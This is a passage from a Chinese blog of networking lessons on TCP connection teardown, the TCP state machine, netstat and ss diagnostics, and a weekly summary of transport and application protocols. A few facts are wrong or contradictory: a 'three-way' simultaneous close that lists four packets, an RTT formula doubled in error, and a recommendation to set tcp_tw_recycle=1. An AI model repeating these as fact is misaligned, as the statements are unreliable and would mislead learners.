net.ipv4.tcp_tw_</span>recycle = 1<br>3. 减少MSL时间（需谨慎）<br>4. 使用连接池复用连接<br></code></pre></td></tr></table></figure><h3 id="4-4-四次挥手的特殊情况"><a href="#4-4-四次挥手的特殊情况" class="headerlink" title="4.4 四次挥手的特殊情况"></a>4.4 四次挥手的特殊情况</h3><p><strong>情况1：三次挥手（同时关闭）</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">场景：双方同时发送FIN<br><br>客户端                      服务器<br>   |<span class="hljs-string">         FIN             </span>|<br>   |<span class="hljs-string">───────────────────────&gt;</span>|<br>   |<span class="hljs-string">         FIN             </span>|<br>   |<span class="hljs-string">&lt;───────────────────────</span>|<br>   |<span class="hljs-string">         ACK             </span>|<br>   |<span class="hljs-string">───────────────────────&gt;</span>|<br>   |<span class="hljs-string">         ACK             </span>|<br>   |<span class="hljs-string">&lt;───────────────────────</span>|<br><br>结果：只需要3次握手（两个FIN + 两个ACK）<br></code></pre></td></tr></table></figure><p><strong>情况2：异常关闭（RST）</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">发送RST的情况：<br><span class="hljs-bullet">1.</span> 连接不存在时收到非SYN包<br><span class="hljs-bullet">2.</span> 连接队列溢出<br><span class="hljs-bullet">3.</span> 端口未监听<br><span class="hljs-bullet">4.</span> 应用程序调用close()时还有未读数据<br><br>RST特点：<br><span class="hljs-bullet">-</span> 立即关闭连接<br><span class="hljs-bullet">-</span> 不经过TIME<span class="hljs-emphasis">_WAIT</span><br><span class="hljs-emphasis">- 接收方不发送ACK</span><br></code></pre></td></tr></table></figure><hr><h2 id="5-TCP状态机"><a href="#5-TCP状态机" class="headerlink" title="5. TCP状态机"></a>5. TCP状态机</h2><h3 id="5-1-完整的TCP状态转换图"><a href="#5-1-完整的TCP状态转换图" class="headerlink" title="5.1 完整的TCP状态转换图"></a>5.1 完整的TCP状态转换图</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                     CLOSED<br>                       |<span class="hljs-string"></span><br><span class="hljs-string">                       </span>|<span class="hljs-string"> (被动打开/listen)</span><br><span class="hljs-string">                       ↓</span><br><span class="hljs-string">                     LISTEN ←───────────┐</span><br><span class="hljs-string">                       </span>|<span class="hljs-string">                 │</span><br><span class="hljs-string">   (主动打开/connect)  </span>|<span class="hljs-string">                 │</span><br><span class="hljs-string">         ↓             </span>|<span class="hljs-string">                 │</span><br><span class="hljs-string">      SYN_SENT         </span>|<span class="hljs-string"> 收到SYN          │</span><br><span class="hljs-string">         </span>|<span class="hljs-string">             </span>|<span class="hljs-string"> 发送SYN+ACK      │</span><br><span class="hljs-string">收到SYN+ACK</span>|<span class="hljs-string">           ↓                 │</span><br><span class="hljs-string">发送ACK    </span>|<span class="hljs-string">        SYN_RCVD              │</span><br><span class="hljs-string">         ↓             </span>|<span class="hljs-string">                 │</span><br><span class="hljs-string">         └─────→ ESTABLISHED ←───────────┘</span><br><span class="hljs-string">                     </span>|<span class="hljs-string">   </span>|<br>         (主动关闭)  |<span class="hljs-string">   </span>|<span class="hljs-string"> (被动关闭)</span><br><span class="hljs-string">         发送FIN     </span>|<span class="hljs-string">   </span>|<span class="hljs-string"> 收到FIN</span><br><span class="hljs-string">                     </span>|<span class="hljs-string">   </span>|<span class="hljs-string"> 发送ACK</span><br><span class="hljs-string">                     ↓   ↓</span><br><span class="hljs-string">               FIN_WAIT_1  CLOSE_WAIT</span><br><span class="hljs-string">                     </span>|<span class="hljs-string">        </span>|<br>         收到ACK     |<span class="hljs-string">        </span>|<span class="hljs-string"> (应用层关闭)</span><br><span class="hljs-string">                     </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> 发送FIN</span><br><span class="hljs-string">                     ↓        ↓</span><br><span class="hljs-string">               FIN_WAIT_2  LAST_ACK</span><br><span class="hljs-string">                     </span>|<span class="hljs-string">        </span>|<br>         收到FIN     |<span class="hljs-string">        </span>|<span class="hljs-string"> 收到ACK</span><br><span class="hljs-string">         发送ACK     </span>|<span class="hljs-string">        </span>|<br>                     ↓        ↓<br>                TIME_WAIT  CLOSED<br>                     |<span class="hljs-string"></span><br><span class="hljs-string">          (等待2MSL) </span>|<br>                     ↓<br>                  CLOSED<br></code></pre></td></tr></table></figure><h3 id="5-2-11种TCP状态详解"><a href="#5-2-11种TCP状态详解" class="headerlink" title="5.2 11种TCP状态详解"></a>5.2 11种TCP状态详解</h3><table><thead><tr><th>状态</th><th>说明</th><th>所处阶段</th></tr></thead><tbody><tr><td><strong>CLOSED</strong></td><td>关闭状态，无连接</td><td>初始&#x2F;结束</td></tr><tr><td><strong>LISTEN</strong></td><td>监听状态，等待连接</td><td>服务器</td></tr><tr><td><strong>SYN_SENT</strong></td><td>发送SYN后，等待SYN+ACK</td><td>客户端三次握手</td></tr><tr><td><strong>SYN_RCVD</strong></td><td>收到SYN，发送SYN+ACK，等待ACK</td><td>服务器三次握手</td></tr><tr><td><strong>ESTABLISHED</strong></td><td>连接建立，可以传输数据</td><td>数据传输</td></tr><tr><td><strong>FIN_WAIT_1</strong></td><td>主动关闭，发送FIN，等待ACK或FIN</td><td>主动关闭方</td></tr><tr><td><strong>FIN_WAIT_2</strong></td><td>收到对方ACK，等待对方FIN</td><td>主动关闭方</td></tr><tr><td><strong>TIME_WAIT</strong></td><td>收到FIN，发送ACK，等待2MSL</td><td>主动关闭方</td></tr><tr><td><strong>CLOSE_WAIT</strong></td><td>收到对方FIN，发送ACK，等待关闭</td><td>被动关闭方</td></tr><tr><td><strong>LAST_ACK</strong></td><td>发送FIN，等待最后的ACK</td><td>被动关闭方</td></tr><tr><td><strong>CLOSING</strong></td><td>双方同时关闭，等待ACK</td><td>同时关闭</td></tr></tbody></table><h3 id="5-3-查看TCP连接状态"><a href="#5-3-查看TCP连接状态" class="headerlink" title="5.3 查看TCP连接状态"></a>5.3 查看TCP连接状态</h3><p><strong>Linux&#x2F;Mac</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看所有TCP连接</span><br>netstat -ant<br><br><span class="hljs-comment"># 统计各状态连接数</span><br>netstat -ant | awk <span class="hljs-string">&#x27;&#123;print $6&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c<br><br><span class="hljs-comment"># 查看ESTABLISHED连接</span><br>netstat -ant | grep ESTABLISHED<br><br><span class="hljs-comment"># 查看TIME_WAIT连接</span><br>netstat -ant | grep TIME_WAIT<br><br><span class="hljs-comment"># 使用ss命令（更快）</span><br>ss -ant<br>ss -ant state established<br>ss -ant state time-wait<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看所有TCP连接</span><br>netstat -ano<br><br><span class="hljs-comment"># 查看指定端口</span><br>netstat -ano | findstr :80<br><br><span class="hljs-comment"># 查看连接统计</span><br>netstat -s -p tcp<br></code></pre></td></tr></table></figure><hr><h2 id="6-实战项目：TCP连接分析工具"><a href="#6-实战项目：TCP连接分析工具" class="headerlink" title="6. 实战项目：TCP连接分析工具"></a>6. 实战项目：TCP连接分析工具</h2><h3 id="6-1-项目功能"><a href="#6-1-项目功能" class="headerlink" title="6.1 项目功能"></a>6.1 项目功能</h3><p>实现一个工具来：</p><ol><li>模拟TCP三次握手</li><li>捕获和分析TCP连接</li><li>显示连接状态统计</li><li>检测异常连接</li></ol><h3 id="6-2-工具演示"><a href="#6-2-工具演示" class="headerlink" title="6.2 工具演示"></a>6.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看TCP连接统计</span><br>python day15_tcp_analyzer.py --stats<br><br><span class="hljs-comment"># 监控指定端口的TCP连接</span><br>python day15_tcp_analyzer.py --monitor 80<br><br><span class="hljs-comment"># 测试TCP连接</span><br>python day15_tcp_analyzer.py --<span class="hljs-built_in">test</span> www.baidu.com 80<br><br><span class="hljs-comment"># 显示连接状态分布</span><br>python day15_tcp_analyzer.py --state-distribution<br></code></pre></td></tr></table></figure><hr><h2 id="7-今日练习"><a href="#7-今日练习" class="headerlink" title="7. 今日练习"></a>7. 今日练习</h2><h3 id="练习1：观察三次握手"><a href="#练习1：观察三次握手" class="headerlink" title="练习1：观察三次握手"></a>练习1：观察三次握手</h3><p>使用Wireshark抓包：</p><ol><li>访问一个网站（如<a href="http://www.baidu.com)/">www.baidu.com）</a></li><li>筛选TCP流：<code>tcp.port == 80</code></li><li>找到三次握手的三个包</li><li>分析每个包的标志位、序列号、确认号</li></ol><h3 id="练习2：查看本机TCP连接"><a href="#练习2：查看本机TCP连接" class="headerlink" title="练习2：查看本机TCP连接"></a>练习2：查看本机TCP连接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux/Mac</span><br>netstat -ant | grep ESTABLISHED<br>ss -ant state established<br><br><span class="hljs-comment"># Windows</span><br>netstat -ano | findstr ESTABLISHED<br><br>思考：<br>1. 有多少个ESTABLISHED连接？<br>2. 它们连接到哪些服务器？<br>3. 有没有TIME_WAIT状态的连接？<br></code></pre></td></tr></table></figure><h3 id="练习3：计算三次握手时延"><a href="#练习3：计算三次握手时延" class="headerlink" title="练习3：计算三次握手时延"></a>练习3：计算三次握手时延</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">抓包分析：<br>- 记录第<span class="hljs-number">1</span>个SYN的时间戳：<span class="hljs-built_in">t1</span><br>- 记录第<span class="hljs-number">2</span>个SYN+ACK的时间戳：<span class="hljs-built_in">t2</span><br>- 记录第<span class="hljs-number">3</span>个ACK的时间戳：<span class="hljs-built_in">t3</span><br><br>计算：<br>- 客户端到服务器RTT: (<span class="hljs-built_in">t2</span> - <span class="hljs-built_in">t1</span>) × <span class="hljs-number">2</span><br>- 完整握手时延: <span class="hljs-built_in">t3</span> - <span class="hljs-built_in">t1</span><br></code></pre></td></tr></table></figure><h3 id="练习4：理解TIME-WAIT"><a href="#练习4：理解TIME-WAIT" class="headerlink" title="练习4：理解TIME_WAIT"></a>练习4：理解TIME_WAIT</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">编写程序：<br><span class="hljs-bullet">1.</span> 创建TCP客户端<br><span class="hljs-bullet">2.</span> 连接服务器<br><span class="hljs-bullet">3.</span> 主动关闭连接<br><span class="hljs-bullet">4.</span> 使用netstat查看TIME<span class="hljs-emphasis">_WAIT状态</span><br><span class="hljs-emphasis">5. 观察2MSL时间后状态变化</span><br></code></pre></td></tr></table></figure><hr><h2 id="8-常见问题"><a href="#8-常见问题" class="headerlink" title="8. 常见问题"></a>8. 常见问题</h2><p><strong>Q1：为什么建立连接是三次握手，关闭连接是四次挥手？</strong></p><p>A：</p><ul><li>建立连接：服务器可以把SYN和ACK合并在一个包中发送（SYN+ACK）</li><li>关闭连接：服务器收到FIN后，可能还有数据要发送，所以ACK和FIN要分开发送</li></ul><p><strong>Q2：如果三次握手的第三次ACK丢失会怎样？</strong></p><p>A：</p><ul><li>服务器会重传SYN+ACK（最多5次）</li><li>客户端已经认为连接建立，可以发送数据</li><li>服务器收到数据包（含ACK）后也认为连接建立</li></ul><p><strong>Q3：为什么TIME_WAIT要等2MSL？</strong></p><p>A：</p><ol><li>确保最后的ACK能够到达对方（1个MSL）</li><li>如果对方没收到，重传FIN需要1个MSL返回</li><li>确保旧连接的所有数据包都已消失</li></ol><p><strong>Q4：大量TIME_WAIT连接有什么危害？</strong></p><p>A：</p><ul><li>占用本地端口（客户端）</li><li>消耗系统资源（内存、CPU）</li><li>可能导致无法建立新连接</li></ul><p>解决：</p><ul><li>使用连接池</li><li>启用SO_REUSEADDR</li><li>调整系统参数</li></ul><p><strong>Q5：客户端和服务器都可以主动关闭连接吗？</strong></p><p>A：</p><ul><li>可以，任何一方都可以主动发送FIN</li><li>主动关闭方会进入TIME_WAIT状态</li><li>这就是为什么服务器端通常设计为由客户端主动关闭</li></ul><hr><h2 id="9-总结"><a href="#9-总结" class="headerlink" title="9. 总结"></a>9. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ol><li><p><strong>TCP特性</strong>：</p><ul><li>面向连接</li><li>可靠传输</li><li>全双工通信</li><li>字节流服务</li></ul></li><li><p><strong>TCP报文格式</strong>：</p><ul><li>20字节固定头部</li><li>重要字段：序列号、确认号、标志位、窗口大小</li></ul></li><li><p><strong>三次握手</strong>：</p><ul><li>SYN → SYN+ACK → ACK</li><li>目的：确认双方能力、协商参数、防止旧连接</li></ul></li><li><p><strong>四次挥手</strong>：</p><ul><li>FIN → ACK → FIN → ACK</li><li>原因：全双工，双向独立关闭</li><li>TIME_WAIT：等待2MSL</li></ul></li><li><p><strong>TCP状态机</strong>：</p><ul><li>11种状态</li><li>状态转换条件</li><li>异常情况处理</li></ul></li></ol><h3 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">TCP三次握手：<br><span class="hljs-number">1</span>️⃣ 客户端 → 服务器：SYN<br><span class="hljs-number">2</span>️⃣ 服务器 → 客户端：SYN+ACK<br><span class="hljs-number">3</span>️⃣ 客户端 → 服务器：ACK<br>✅ 连接建立<br><br>TCP四次挥手：<br><span class="hljs-number">1</span>️⃣ 客户端 → 服务器：FIN<br><span class="hljs-number">2</span>️⃣ 服务器 → 客户端：ACK<br><span class="hljs-number">3</span>️⃣ 服务器 → 客户端：FIN<br><span class="hljs-number">4</span>️⃣ 客户端 → 服务器：ACK<br>⏳ TIME_WAIT (<span class="hljs-number">2MS</span>L)<br>✅ 连接关闭<br></code></pre></td></tr></table></figure><h3 id="明天预告"><a href="#明天预告" class="headerlink" title="明天预告"></a>明天预告</h3><p><strong>第16天：TCP可靠传输机制</strong></p><p>内容预览：</p><ul><li>序列号和确认号详解</li><li>滑动窗口机制</li><li>超时重传</li><li>快速重传和快速恢复</li><li>流量控制</li><li>拥塞控制</li></ul><hr><p><strong>继续加油！</strong> 🚀</p><p>今天我们深入学习了TCP协议的基础知识，理解了三次握手和四次挥手的完整过程。这些是TCP协议的核心，也是网络面试的高频考点。明天我们将学习TCP如何实现可靠传输！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>三周总结：传输层和应用层协议</title>
    <link href="/2025/11/10/%E4%B8%89%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82%E5%92%8C%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/11/10/%E4%B8%89%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E4%BC%A0%E8%BE%93%E5%B1%82%E5%92%8C%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="第三周总结：传输层和应用层协议"><a href="#第三周总结：传输层和应用层协议" class="headerlink" title="第三周总结：传输层和应用层协议"></a>第三周总结：传输层和应用层协议</h1><h2 id="学习时间：第15-21天"><a href="#学习时间：第15-21天" class="headerlink" title="学习时间：第15-21天"></a>学习时间：第15-21天</h2><hr><h2 id="📚-本周学习内容"><a href="#📚-本周学习内容" class="headerlink" title="📚 本周学习内容"></a>📚 本周学习内容</h2><h3 id="Day-15：TCP协议基础"><a href="#Day-15：TCP协议基础" class="headerlink" title="Day 15：TCP协议基础"></a>Day 15：TCP协议基础</h3><ul><li>TCP特点和应用场景</li><li>TCP报文格式</li><li>三次握手建立连接</li><li>四次挥手断开连接</li><li>TCP状态机（11种状态）</li><li>TIME_WAIT的作用</li><li>SYN Flood攻击和防御</li></ul><h3 id="Day-16：TCP可靠传输机制"><a href="#Day-16：TCP可靠传输机制" class="headerlink" title="Day 16：TCP可靠传输机制"></a>Day 16：TCP可靠传输机制</h3><ul><li>序列号和确认号</li><li>超时重传机制</li><li>快速重传和快速恢复</li><li>滑动窗口协议</li><li>流量控制</li><li>拥塞控制算法（慢启动、拥塞避免）</li><li>RTO计算（Jacobson算法）</li></ul><h3 id="Day-17：UDP协议详解"><a href="#Day-17：UDP协议详解" class="headerlink" title="Day 17：UDP协议详解"></a>Day 17：UDP协议详解</h3><ul><li>UDP特点和应用场景</li><li>UDP报文格式（8字节）</li><li>UDP vs TCP对比</li><li>可靠UDP实现</li><li>UDP广播和多播</li><li>UDP应用：DNS、DHCP、音视频</li></ul><h3 id="Day-18：Socket编程进阶"><a href="#Day-18：Socket编程进阶" class="headerlink" title="Day 18：Socket编程进阶"></a>Day 18：Socket编程进阶</h3><ul><li>阻塞vs非阻塞Socket</li><li>IO多路复用（select&#x2F;poll&#x2F;epoll）</li><li>Socket选项配置</li><li>高性能服务器架构</li><li>C10K问题和解决方案</li><li>实战：多人聊天室</li></ul><h3 id="Day-19：HTTP协议基础"><a href="#Day-19：HTTP协议基础" class="headerlink" title="Day 19：HTTP协议基础"></a>Day 19：HTTP协议基础</h3><ul><li>HTTP工作原理</li><li>HTTP请求和响应格式</li><li>HTTP方法（GET、POST、PUT、DELETE等）</li><li>HTTP状态码（1xx-5xx）</li><li>Cookie和Session机制</li><li>HTTP版本演进（1.0&#x2F;1.1&#x2F;2&#x2F;3）</li><li>实战：HTTP服务器</li></ul><h3 id="Day-20：HTTPS和安全"><a href="#Day-20：HTTPS和安全" class="headerlink" title="Day 20：HTTPS和安全"></a>Day 20：HTTPS和安全</h3><ul><li>加密基础（对称加密、非对称加密、哈希）</li><li>TLS&#x2F;SSL协议</li><li>HTTPS握手过程（TLS 1.2、TLS 1.3）</li><li>数字证书和CA</li><li>常见Web安全攻击</li><li>安全最佳实践</li><li>实战：HTTPS服务器</li></ul><h3 id="Day-21：综合实战"><a href="#Day-21：综合实战" class="headerlink" title="Day 21：综合实战"></a>Day 21：综合实战</h3><ul><li>知识点回顾</li><li>性能优化技巧</li><li>调试和排错方法</li><li>工具和资源推荐</li><li>实战：安全Web应用平台</li></ul><hr><h2 id="🎯-核心知识点"><a href="#🎯-核心知识点" class="headerlink" title="🎯 核心知识点"></a>🎯 核心知识点</h2><h3 id="1-TCP协议"><a href="#1-TCP协议" class="headerlink" title="1. TCP协议"></a>1. TCP协议</h3><p><strong>三次握手</strong>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">客户端                 服务器<br>  │                      │<br>  │─────── SYN ────────→│  (<span class="hljs-number">1</span>)<br>  │←──── SYN-ACK ───────│  (<span class="hljs-number">2</span>)<br>  │─────── ACK ────────→│  (<span class="hljs-number">3</span>)<br>  │                      │<br> 连接建立<br></code></pre></td></tr></table></figure><p><strong>四次挥手</strong>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">客户端                 服务器<br>  │                      │<br>  │─────── FIN ────────→│  (<span class="hljs-number">1</span>)<br>  │←────── ACK ─────────│  (<span class="hljs-number">2</span>)<br>  │←────── FIN ─────────│  (<span class="hljs-number">3</span>)<br>  │─────── ACK ────────→│  (<span class="hljs-number">4</span>)<br>  │                      │<br> 连接关闭<br></code></pre></td></tr></table></figure><p><strong>关键概念</strong>：</p><ul><li>序列号：标识发送的每个字节</li><li>确认号：期望接收的下一个序列号</li><li>滑动窗口：流量控制</li><li>拥塞窗口：拥塞控制</li><li>TIME_WAIT：2MSL等待时间</li></ul><h3 id="2-UDP协议"><a href="#2-UDP协议" class="headerlink" title="2. UDP协议"></a>2. UDP协议</h3><p><strong>特点</strong>：</p><ul><li>无连接、不可靠、快速</li><li>8字节头部（源端口、目标端口、长度、校验和）</li><li>适合实时应用</li></ul><p><strong>使用场景</strong>：</p><ul><li>实时音视频</li><li>在线游戏</li><li>DNS查询</li><li>流媒体</li></ul><h3 id="3-Socket编程"><a href="#3-Socket编程" class="headerlink" title="3. Socket编程"></a>3. Socket编程</h3><p><strong>IO多路复用对比</strong>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──────────┬──────────┬──────────┬──────────┐<br>│  特性    │  <span class="hljs-selector-tag">select</span>  │   poll   │  epoll   │<br>├──────────┼──────────┼──────────┼──────────┤<br>│ 最大连接 │   <span class="hljs-number">1024</span>   │   无限   │   无限   │<br>│ 复杂度   │   <span class="hljs-built_in">O</span>(n)   │   <span class="hljs-built_in">O</span>(n)   │   <span class="hljs-built_in">O</span>(<span class="hljs-number">1</span>)   │<br>│ 跨平台   │    ✅    │  部分✅  │    ❌    │<br>│ 性能     │    低    │    中    │    高    │<br>└──────────┴──────────┴──────────┴──────────┘<br></code></pre></td></tr></table></figure><p><strong>推荐架构</strong>：</p><ul><li>Linux：epoll + 非阻塞</li><li>高并发：IO多路复用 + 线程池</li><li>实时应用：异步IO + 事件循环</li></ul><h3 id="4-HTTP协议"><a href="#4-HTTP协议" class="headerlink" title="4. HTTP协议"></a>4. HTTP协议</h3><p><strong>请求格式</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /index.html HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: www.example.com<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span><span class="hljs-meta"></span><br><span class="hljs-meta">[空行]</span><span class="hljs-meta"></span><br><span class="hljs-meta">[请求体]</span><br></code></pre></td></tr></table></figure><p><strong>响应格式</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Content</span>-Type: text/html<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">1234</span><span class="hljs-meta"></span><br><span class="hljs-meta">[空行]</span><span class="hljs-meta"></span><br><span class="hljs-meta">[响应体]</span><br></code></pre></td></tr></table></figure><p><strong>常用状态码</strong>：</p><ul><li>200 OK：成功</li><li>301 Moved Permanently：永久重定向</li><li>302 Found：临时重定向</li><li>304 Not Modified：未修改（缓存有效）</li><li>400 Bad Request：请求错误</li><li>401 Unauthorized：未认证</li><li>403 Forbidden：禁止访问</li><li>404 Not Found：未找到</li><li>500 Internal Server Error：服务器错误</li></ul><h3 id="5-HTTPS和安全"><a href="#5-HTTPS和安全" class="headerlink" title="5. HTTPS和安全"></a>5. HTTPS和安全</h3><p><strong>HTTPS &#x3D; HTTP + TLS&#x2F;SSL</strong></p><p><strong>加密流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 客户端发起连接（ClientHello）<br><span class="hljs-bullet">2.</span> 服务器返回证书（Certificate）<br><span class="hljs-bullet">3.</span> 客户端验证证书<br><span class="hljs-bullet">4.</span> 密钥交换（KeyExchange）<br><span class="hljs-bullet">5.</span> 切换到加密通信<br><span class="hljs-bullet">6.</span> 传输加密数据<br></code></pre></td></tr></table></figure><p><strong>混合加密</strong>：</p><ul><li>RSA（非对称）：交换密钥</li><li>AES（对称）：加密数据</li></ul><p><strong>安全防护</strong>：</p><ul><li>CSRF：Token验证</li><li>XSS：输出编码、CSP</li><li>SQL注入：参数化查询</li><li>密码：哈希+盐</li></ul><hr><h2 id="💻-实战项目"><a href="#💻-实战项目" class="headerlink" title="💻 实战项目"></a>💻 实战项目</h2><h3 id="1-TCP连接分析器（Day-15）"><a href="#1-TCP连接分析器（Day-15）" class="headerlink" title="1. TCP连接分析器（Day 15）"></a>1. TCP连接分析器（Day 15）</h3><ul><li>解析netstat输出</li><li>分析TCP连接状态</li><li>统计连接分布</li><li>演示三次握手和四次挥手</li></ul><h3 id="2-TCP可靠性模拟器（Day-16）"><a href="#2-TCP可靠性模拟器（Day-16）" class="headerlink" title="2. TCP可靠性模拟器（Day 16）"></a>2. TCP可靠性模拟器（Day 16）</h3><ul><li>RTO计算（Jacobson算法）</li><li>拥塞控制模拟</li><li>滑动窗口演示</li><li>性能分析</li></ul><h3 id="3-UDP应用套件（Day-17）"><a href="#3-UDP应用套件（Day-17）" class="headerlink" title="3. UDP应用套件（Day 17）"></a>3. UDP应用套件（Day 17）</h3><ul><li>UDP回显服务器&#x2F;客户端</li><li>UDP聊天室</li><li>可靠UDP实现</li><li>性能测试</li></ul><h3 id="4-多人聊天服务器（Day-18）"><a href="#4-多人聊天服务器（Day-18）" class="headerlink" title="4. 多人聊天服务器（Day 18）"></a>4. 多人聊天服务器（Day 18）</h3><ul><li>IO多路复用（epoll&#x2F;select）</li><li>非阻塞Socket</li><li>支持100+并发</li><li>私聊和广播功能</li></ul><h3 id="5-HTTP服务器（Day-19）"><a href="#5-HTTP服务器（Day-19）" class="headerlink" title="5. HTTP服务器（Day 19）"></a>5. HTTP服务器（Day 19）</h3><ul><li>完整HTTP&#x2F;1.1实现</li><li>静态文件服务</li><li>RESTful API</li><li>Cookie支持</li></ul><h3 id="6-HTTPS服务器（Day-20）"><a href="#6-HTTPS服务器（Day-20）" class="headerlink" title="6. HTTPS服务器（Day 20）"></a>6. HTTPS服务器（Day 20）</h3><ul><li>证书生成器</li><li>TLS&#x2F;SSL支持</li><li>证书验证</li><li>安全配置</li></ul><h3 